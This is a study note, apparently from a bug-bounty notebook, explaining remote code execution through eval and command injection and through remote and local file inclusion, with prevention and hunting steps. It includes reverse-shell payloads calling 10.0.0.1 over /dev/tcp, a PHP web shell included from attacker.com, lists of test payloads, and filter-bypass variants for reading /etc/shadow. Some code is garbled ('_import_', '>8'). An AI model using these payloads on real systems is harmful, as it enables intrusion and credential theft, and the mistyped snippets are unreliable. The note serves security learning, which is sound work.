[[RCE]]
There is no one singular technique used to achieve RCE. You can achieve it by exploiting further things like SQL Injection, Insecure Deserialization, Template Injection etc. Also further exploiting RCE requires high technical knowledge so you should jump further if you know what you're doing.

### **Mechanisms of RCE**
Sometimes attackers can achieve RE via injection of malicious code directly into code that will be executed. Those vulnerabilities are **code injections**. You can also do that by putting malicious code into file executed or included by victims application. We call that **file inclusion**.

##### Code Injection
They happen when application can't differ data provided by user from code to be executed. Most of the time it happens because of lack of sanitization. Sometimes it is intended functionality, which can be abused. Lets say you're a programmer trying to make Python calculator for web. 
We use eval(), because this functionality is very elastic and pretty much does everything for us already.
```
return eval("{}".format(input))

result = calculate(user_input.calc)
print("Wynik wynosi {}."format(result))
```

Program will require user to provide String that will be evaluated.
User will have to make something of a following request in order to get result back

```
GET /calculator?calc=1+2
HOST example.com
```
Because eval() downloads input data and executes it as the python code attacker can provide application with something more malicious like:
```
GET /calculator?calc="_import_('os').system('ls')
Host: example.com
```
Attacker then can get list of files that are in webapp directory as a result.

Attackers can also do something much more harmful for example he can try to connect himself to Systems reverse shell, which will allow him to actually have Remote Code Execution without using python anymore:
```
GET /calculator?calc="_import_('os').system('bash -i >& /dev/tcp/10.0.0.1/8080
0>&1')"
Host: example.com
```



Second way of achieving Code Injection is when the input data of an user is connected directly with command in System command line. We call that **Command Injection**. Command injections might be present even in complicated frameworks, because of their complexity and many dependencies that they use.

Lets say example.com also has a functionality which allows to download external file and showing it on the webpage. To service this functionality application uses wget command to download remote file.
```
import os 

def download(url):
	os.system("wget -0- {}".format(url))

display(download(user_input.url))
```
As a whole program downloads URL address from user input and it directs it to wget command executed by using os.system(). If you will send following request, application will download source code of Google main page.
```
GET /downloadurl=google.com
Host: example.com
```
Because user inputted data is send directly to command line, attacker can then inject system commands without using python. It happens because in commandline of Linux ; seperate commands, so attacker can do any command after wget just by doing something like this:
```
GET /downloadurl="google.com;bash -i >8 /dev/tcp/10.0.0.1/8080 0>&1"
Host: example.com

```
And this will send him back a reverse shell.

##### File Inclusion
Most of programming languages has function which allows programmers to include external files in order to evaluate code in them. It is helpful, when programmers try to include external files into their applications. Forcing target server to include file which has malicious code is next way of achieving RCE. 

This vulnerability has two types:
**Remote file inclusion** and **local file inclusion**

Remote file inclusion vulnerabilities occur when the application allows any files from a remote server to be included. This happens when applications dynamically include external files and scripts on their pages and use user input to determine the location of the included file.

Too see how it works we will take closer look to an application vulnerable to the remote file inclusion.
Below PHP code executes function include for the user inputted parameter of the GET request. Include function includes file and evaluates it.
```
<?php
//some php code

$file = $_GET["page"];
include $file;
//more php code

?>
```
This code allows user to have access to different webpages by using page parameter. To show user Index or about page user will have to use corresponding urls: 
``http://example.com/?page=index.php
``http://example.com/?page=about.php
Unless the application limits files included by user by using page parameter, attacker can include PHP file hosted on his own server and force target server to execute it.

In this case we're hosting PHP page which has malicious.php name, which will execute command which is parsed to it via cmd parameter from GET request. System() is similar to pythons  os.system(). Below we can see the code:
```
<?PHP
	system($_GET["cmd"])
?>
```

Attacker could potentially do request to target machine looking something like this:
```
GET /?page=http://attacker.com/malicious.php?cmd=ls
Host: example.com
```

This server could potentially be vulnerable to also SSRFs and XSSs, because website can load informations about local system and private network. Attacker can also potentially force site to load malicious JavaScript file and force its user to clicking into it in order to perform reflected XSS.

**Local File Inclusion** on the other hand happen when applications include files in an unsafe way, but the inclusion of remote files is forbidden. In this case, attackers need to first upload a malicious file to the local machine, and then execute it by using local file inclusion. Let’s modify our previous example a bit. The following PHP file first gets the HTTP GET parameter page and then calls the PHP include function after concatenating page with a directory name containing the files users can load.

```
<?php 
// Some PHP code

$file = $ GET["page"]; 
include "lang/".$file;

// Some PHP code 
?>
```
Directory lang of the webpage contains website written in many languages. Users can enter urls like http://example.com/?page=pl-index.pl to see the website in polish language. This url addresses make the site load different pages.
If the application doesn't make any restrictions to user he can easily try to load his own page with this functionality. For example example.com allows user to send files. Now user can try to execute his own file by doing something like this:
 http://example.com/?page=../uploads/TurtleBB/malicious.php.

### **Prevention**
To prevent RCE you should avoid using user inputted data to code that is evaluated. Never trust files sent by user, applications or whatever. Never allow file inclusion from the user inputted data. If that isn’t possible, disallow the inclusion of remote files and create an allowlist of local files that your programs can include. You can also limit file uploads to certain safe file types and host uploaded files in a separate environment than the application’s source code

Avoid directly calling commands and use system interface API. Most programming languages contain default functionlities, which allows using system commands, but without risk of being injected.

Always apply restrictions to user inputted data.

Update your software, frameworks, dependencies. Many open-source tools, packages and components are implementing vulnerabilities. This phenomenon is also known as [[Software Supply Chain Attack]].

Additionally you can implement [[WAF]]

Always use principle of least privilege. Never give more access to application that they need to avoid bigger impact of small vulnerabilities.

### **Hunting down the RCE**
As almost always there are two types of RCE
**Blind RCE** and **classic RCE** also known as just **RCE**.
In BLIND RCEs code is executed but there is no response fed back into the attacker.

Helpful command for doing classical RCE:
``whoami 
Helpful command for doing blind RCE:
``sleep 5

##### 1st step
Do reconnaissance. If u want to hunt down RCE this step is most crucial, because this vulnerability is really dependent on the technology stack used by target.

##### 2nd step
Look for locations where users can send data through inputs. As always things like url adresses, http headers, body parameters and transferring files. To find potential file inclusion vulnerabilities, check for input locations being used to determine filenames or paths, as well as any file-upload functionalities in the application

##### 3rd step
Send test payloads:

###### Python:
``print("Test RCE!")
``"_import_('os').system('ls')"
``"_import_('os').system('sleep 5')"

###### PHP:
``phpinfo();
``<?php system("ls");?>
``<?php system("sleep 10");?>

###### To test command injection:
``;ls;
```
| sleep 10;
& sleep 10;
` sleep 10;`
$(sleep 10)
```


###### File inclusion:
You should try to include remote file that you can control:
`` http://example.com/?page=http://attacker.com/malicious.php
``http://example.com/?page=http:attacker.com/malicious.php
Or try to transfer file and include id by looking for its path
``http://example.com/?page=../uploads/malicious.php
``http://example.com/?page=..%2fuploads%2malicious.php
You can try to use [[SSRF]] methods to access it.

##### 4th Step
Confirm presence of the vulnerability by doing  whoami or ls or sleep 5.

### **Escalation**
You should try to not escalate, because most of the bug bounty programs wouldn't want you to search through confidential data. In typical penetration testing users try to tell what are their users permission and how can they escalate their privilege further. But, when you're bug bounting it isn't good, because there might be confidential data out there that you don't have access to normally. 

While doing classical RCE just create PoC by doing whoami or ls. Or you can create file which contains your name: 
``touch rce_by_TurtleBB

While doing blind RCE create PoC that does sleep command. Or you can create reverse shell to be perceived more seriously.

### **Bypassing protection**
Many hosts started using WAFs or validations of data. But there are also ways of bypassing those.
For example in Unix command you can put ' " without changing behavior of command. You can also use wildcards to substitute for arbitrary characters, because system might be blocking certain Strings.  Finally, any empty command substitution results can be inserted into the string without changing the results. For example, the following commands will all print the contents of /etc/shadow:
```
cat /etc/shadow 
cat "/e"tc'/shadow' 
cat /etc/sh*dow 
cat /etc/sha** dow 
cat /etc/sha$()dow 
cat /etc/sha${}dow
```

You can try and change ways of writing same command in PHP.
For example:
``system('cat /etc/shadow')
Can be written as:
```
('sys'.'tem')('cat /etc/shadow');
system/**/('1s');
"\x73\X79\x73\x74\x65\x6d'('1s");
_import_('os').system('cat /etc/shadow') 
_import_('o'+'s').system('cat /etc/shadow')
_import_('\x6f\x73').system('cat /etc/shadow')
```

Sometimes servers allow concatanation of same parameter by including it many times in same http request:

```
GET /calculator?calc="_import_('os').sy"&calc="stem('ls')"
Host: example.com
```

There are many ways of escaping WAFs and validators. Using hexadecimal code, using lower and uppercases, inputting special characters like zero bytes or new lines or escape chars (\). You can also try putting other chars then ASCII.



``

